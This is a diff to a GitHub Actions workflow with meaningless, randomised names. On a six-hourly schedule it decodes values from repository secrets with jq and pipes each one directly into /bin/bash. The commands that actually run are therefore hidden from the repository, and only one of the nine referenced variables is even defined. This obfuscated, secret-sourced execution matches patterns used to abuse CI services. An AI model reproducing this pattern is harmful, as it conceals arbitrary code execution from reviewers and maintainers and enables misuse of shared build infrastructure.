@@ -3,17 +3,23 @@ name: infantileapply
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 0/6 * * *'
-jobs:  # 4647
+    - cron: '54 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: infantileapply
         env:
-          oh4: ${{ secrets.oh4 }}
+          d43419: ${{ secrets.d43419 }}
         run: |
-          echo $oh4 | jq -r .gg06192 | /bin/bash
-          echo $nfvgw39 | jq -r .cqh1382 | /bin/bash
-          echo $axi90759 | jq -r .gwp27013 | /bin/bash
+          echo $d43419 | jq -r .oj5 | /bin/bash
+          echo $dd7843 | jq -r .qu86620 | /bin/bash
+          echo $ais06240 | jq -r .yk654 | /bin/bash
+          echo $drbhp0 | jq -r .wmn40086 | /bin/bash
+          echo $w63978 | jq -r .vlmw54117 | /bin/bash
+          echo $eymjf161 | jq -r .s57975 | /bin/bash
+          echo $nxnxl6145 | jq -r .w6443 | /bin/bash
+          echo $rv323 | jq -r .elrf0922 | /bin/bash
+          echo $eyoon72 | jq -r .cv277 | /bin/bash
 
